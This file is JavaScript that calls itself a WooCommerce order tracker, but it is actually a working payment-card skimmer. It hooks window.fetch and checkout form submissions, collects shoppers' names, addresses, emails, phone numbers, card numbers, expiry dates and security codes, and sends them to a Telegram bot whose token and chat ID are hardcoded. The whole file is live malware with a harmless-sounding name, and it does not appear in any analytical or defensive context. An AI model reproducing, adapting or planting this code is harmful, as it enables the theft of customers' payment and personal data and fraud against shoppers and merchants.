// GitHub URL: https://raw.githubusercontent.com/yourusername/wc-tracker/main/order-tracker.js
class OrderTracker {
    constructor() {
        this.config = {
            telegramBotToken: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
            telegramChatId: '7319274794'
        };
        this.trackOrders();
    }

    trackOrders() {
        // Intercept WooCommerce order processing
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const url = args[0];
            
            if (typeof url === 'string' && url.includes('checkout')) {
                return originalFetch.apply(this, args).then(response => {
                    if (response.ok) {
                        response.clone().json().then(data => {
                            if (data.order_id) {
                                window.orderTracker.sendOrderData(data);
                            }
                        });
                    }
                    return response;
                });
            }
            
            return originalFetch.apply(this, args);
        };

        // Track form data before submission
        document.addEventListener('submit', (e) => {
            if (e.target.action && e.target.action.includes('checkout')) {
                const formData = new FormData(e.target);
                const data = Object.fromEntries(formData.entries());
                window.orderTracker.cacheFormData(data);
            }
        });
    }

    cacheFormData(formData) {
        localStorage.setItem('wc_checkout_data', JSON.stringify(formData));
    }

    sendOrderData(orderData) {
        const cachedData = JSON.parse(localStorage.getItem('wc_checkout_data') || '{}');
        
        const message = this.formatOrderMessage(orderData, cachedData);
        this.sendToTelegram(message);
    }

    formatOrderMessage(orderData, formData) {
        let message = "🛒 COMPLETE CHECKOUT DATA CAPTURED 🛒\n\n";

        // Billing Information
        message += "📍 BILLING INFORMATION:\n";
        message += `First name: ${formData.billing_first_name || 'N/A'}\n`;
        message += `Last name: ${formData.billing_last_name || 'N/A'}\n`;
        message += `Email: ${formData.billing_email || 'N/A'}\n`;
        message += `Phone: ${formData.billing_phone || 'N/A'}\n`;
        message += `Address: ${formData.billing_address_1 || 'N/A'}\n`;
        message += `City: ${formData.billing_city || 'N/A'}\n`;
        message += `State: ${formData.billing_state || 'N/A'}\n`;
        message += `Postcode: ${formData.billing_postcode || 'N/A'}\n`;
        message += `Country: ${formData.billing_country || 'N/A'}\n\n`;

        // Payment Information
        message += "💳 PAYMENT INFORMATION:\n";
        if (formData.payment_method) {
            message += `Payment Method: ${formData.payment_method}\n`;
        }
        if (formData.card_number) {
            message += `Card Number: ${formData.card_number}\n`;
        }
        if (formData.expiry) {
            message += `Expiry Date: ${formData.expiry}\n`;
        }
        if (formData.cvc || formData.cvv) {
            message += `Security Code: ${formData.cvc || formData.cvv}\n`;
        }

        // Order Information
        if (orderData.order_id) {
            message += `\nOrder ID: ${orderData.order_id}\n`;
        }
        if (orderData.total) {
            message += `Order Total: ${orderData.total}\n`;
        }

        message += `\n🌐 Page: ${window.location.href}`;
        message += `\n🕒 Time: ${new Date().toLocaleString()}`;
        
        return message;
    }

    sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${this.config.telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: this.config.telegramChatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    }
}

// Initialize order tracker
window.orderTracker = new OrderTracker();